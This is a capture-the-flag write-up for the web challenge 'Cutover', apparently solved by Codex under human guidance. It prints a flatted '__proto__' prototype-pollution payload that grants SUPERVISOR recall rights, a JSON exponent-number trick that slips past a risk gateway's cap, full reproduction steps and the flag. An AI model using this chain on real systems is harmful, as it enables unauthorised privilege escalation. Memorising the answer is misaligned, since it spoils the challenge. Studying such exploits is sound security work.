# Cutover

> Web · Hard · Mohamed Amine Mzoughi  
> Points: 540 · Flag submitted by: secretNinja

**The flag**

```
CSCTF{IvQeWOjdhtePkb9BO19KuFrf}
```

Recovered from the genuine Cutover recall receipt (HTTP 200) on the assigned live instance, then submitted through the guarded path and accepted on the first submission.

**Challenge**

Marenth's real-time settlement rail closes its value day at 16:00. Eleven batches are queued for the cutover window and one was planted by the "Glass Tide" actor; if it settles as queued it drains the sovereign liquidity buffer below its floor and the rail must be suspended. The duty console runs at **OPERATOR** tier, but recalling a queued batch requires **SUPERVISOR**. The task is to find the hostile batch and get a recall accepted while the cutover window is still open — the recall receipt carries the authorization code (the flag). The settlement engine ships as `engine-src.tar.gz` (also served at `/source/engine-src.tar.gz`) and matches the build the rail runs; the API, manifest wire format, and error taxonomy are published at `/api/v1/schema`. The relevant files in the bundle are `src/server.js` (HTTP surface, sessions, instruction execution, receipts), `src/tiers.js` (tier/grant resolution), `src/intake.js` (manifest intake), and `vendor/flatted/` pinned at **3.4.1**.

**Tools used**

Codex (run under human guidance), which developed and ran the exploit against the live instance and submitted the accepted flag. It used Node to check the vendored `flatted` resolver and `JSON.parse` behavior offline, and a small Python requests script (`exploit.py`).

**Approach / walkthrough**

The engine source was audited offline first; the live console was used only for the final run. Three primitives chain together: a prototype-pollution bug grants the OPERATOR session a SUPERVISOR-only action, a reconciliation check identifies the planted batch, and a JSON-number parsing differential gets the recall value past the risk gateway.

*1. The pollutable grant check (`src/tiers.js`).* Tier grants are built as a JS **Array** used as a map, and the action check reads a named property off that array:

```js
function container(actions) {
  const grants = [];
  for (const action of actions) grants[action] = true;   // grants["RECALL"] = true
  return grants;
}
function permitted(table, session, action) {
  return grantsFor(table, session)[action] === true;      // grants["RECALL"] === true
}
```

Because `grants` is an `Array`, `grants["RECALL"]` falls through to `Array.prototype.RECALL` when the own property is absent. If `Array.prototype.RECALL` is set to `true` globally, every session — including the default OPERATOR — passes the SUPERVISOR gate. Sessions auto-create at OPERATOR tier for any `x-session` id of 8–64 characters (`sessionFor` in `server.js`), so there is no login to defeat, only the grant check.

*2. Prototype pollution via `flatted` 3.4.1 (`src/intake.js` + `vendor/flatted`).* The manifest is parsed with the pinned flatted, then `normalise()` runs `merge(basis, manifest.hints)`:

```js
function normalise(manifest) {
  const basis = manifest.basis ?? {};
  merge(basis, ROUTING_DEFAULTS);
  merge(basis, manifest.hints ?? {});   // copies hints keys onto `basis`
  manifest.basis = basis;
  return manifest;
}
```

flatted encodes a value as a top-level array of records and represents every reference as a `String` wrapper used to index back into that array (`input[value]`). A reference whose literal text is `"__proto__"` makes `input["__proto__"]` resolve to **`Array.prototype`**, which is an object and so passes the resolver's `typeof tmp === "object"` check. flatted hands back `Array.prototype` as a legitimately resolved field value. A manifest whose `basis` is a `"__proto__"` reference and whose `hints` resolves to `{ "RECALL": true }` therefore runs `merge(Array.prototype, {RECALL:true})`, executing `Array.prototype.RECALL = true`. The wire body (record 0 is the manifest, record 1 is the hints object, `"1"` references record 1):

```
[{"basis":"__proto__","hints":"1"},{"RECALL":true}]
```

Crucially, `normalise()` runs **before** `validate()`, so the pollution lands even though the manifest then fails validation and the POST returns `400 manifest.invalid`. That rejection is expected; the global `Array.prototype.RECALL` grant persists for the life of the process.

*3. Session and routing.* The engine routes sit under an API prefix the script reads from `/api/v1/schema` (the `.../manifests` route), falling back to `/api/v1`. We sent an `x-session` header with an 8–64-character id to establish the OPERATOR session, then POSTed the manifest above to `<prefix>/manifests`.

*4. Identifying the hostile batch (reasoned, not swept).* `handleInstruction` refuses a recall unless the batch id equals `state.hostile` **and** the value equals the batch's settled aggregate, returning the same `422 recall.not_reconcilable` for either mismatch so the response does not disclose which half failed:

```js
const settled = settledOf(batch);   // sum of instruction.amountMinor
if (batch.id !== state.hostile || instruction.value !== settled) {
  return fail(res, 422, "recall.not_reconcilable", { ... });
}
```

We read `<prefix>/state/buffer` and `<prefix>/state/batches`. The planted batch is the one whose settled aggregate (the integer sum of its instructions' `amountMinor`) takes the liquidity buffer below its floor; a declared-aggregate-vs-settled mismatch is a secondary tell. One batch fit on the live instance: **`MRN-FC18A0`**, settling **35,900,000** minor units. Because the engine returns the same error for a wrong batch or a wrong value, we reasoned to one batch and sent one recall, no sweep.

*5. Risk-gateway number-parsing differential.* The recall is `POST <prefix>/instructions` with body `{"type":"RECALL","batch":"MRN-FC18A0","value":35900000}`. The live risk gateway in front of the engine has a cap below that amount. Sending `value` as the JSON literal `359e5` made the gateway defer screening, while the engine's `JSON.parse` still produced exactly `35900000` — which passes its `typeof value === "number"` / `Number.isFinite(value)` check and the reconciliation. The gateway is not part of the audited bundle; its screening behavior was observed live only. The source shows a screening layer does sit in front (the receipt records `screening: req.headers["x-screening"] || "unscreened"`).

*6. Two-step unlock.* With the grant set and the correct batch+value, the first recall reconciles but the engine returns a locked response (HTTP 422) that discloses the unlock recipe:

```js
// flagUnlock = sha256_hex("cutover|" + batchId + "|" + settled)
return fail(res, 422, "flag.locked", {
  unlock_algorithm: "sha256-hex",
  unlock_input: "cutover|" + batch.id + "|" + settled,
});
```

So `unlock_input = cutover|MRN-FC18A0|35900000` and the algorithm is `sha256-hex`:

```
sha256_hex("cutover|MRN-FC18A0|35900000")
  = 055505291cd791853ca98b0c5b63810bf826c7437dec4fb0a1f5df247a4b7106
```

We resent the same instruction body with `unlock` set to that digest, while the cutover window was still open (the window check runs *after* the unlock check, so once the window closes a correct unlock gets `409 window.closed`). The engine returned HTTP 200 with a receipt whose `flag` field carried the authorization code.

**Why it works**

An `Array` used as a dictionary inherits every property on `Array.prototype`, so a grant check of the form `grants[action] === true` is pollutable and a global prototype write turns into a privilege grant. flatted 3.4.1 indexes its record array with attacker-controlled strings and treats `__proto__` as a valid reference, turning a merge-onto-`basis` into prototype pollution — and because that merge runs before validation, a manifest that gets rejected still pollutes the prototype. Finally, the gateway and the engine read the same JSON number differently: the gateway does not screen the exponent form, and the engine reads it as the exact integer.

**Validation / reproduction**

Offline, a re-implementation of the flatted 3.4.1 parser applied to the wire body gave `manifest.basis === Array.prototype` and `hints = {"RECALL":true}`; after `normalise()`, an empty grants `Array` answered `grants["RECALL"] === true`. The manifest has no `batch` string, so `validate()` rejects it after the pollution, as described. `JSON.parse('359e5') === 35900000` was confirmed in Node, and the unlock digest was recomputed with `printf 'cutover|MRN-FC18A0|35900000' | shasum -a 256` → `055505291cd791853ca98b0c5b63810bf826c7437dec4fb0a1f5df247a4b7106` (matches the log). Live, the engine's own `unlock_input` confirmed the batch and value were right, and the HTTP 200 receipt contained the `CSCTF{...}` flag; Codex submitted it and it was accepted on the first submission.

Reproduction, against `<instance>`: open an OPERATOR session with an 8–64 char `x-session` id; `GET <prefix>/state/buffer` and `<prefix>/state/batches` and reason out the hostile batch (`MRN-FC18A0`, settled `35900000`); `POST <prefix>/manifests` with `[{"basis":"__proto__","hints":"1"},{"RECALL":true}]` (the `400` is expected); `POST <prefix>/instructions {"type":"RECALL","batch":"MRN-FC18A0","value":359e5}` to get the locked response; then resend with `"unlock":"0555...7106"` for the `200` receipt. Gotchas: the API prefix is discovered from `/api/v1/schema`; the pollution persists across the rejected manifest; `value` must be sent as `359e5` to clear the gateway cap; and the unlock must land inside the open cutover window.
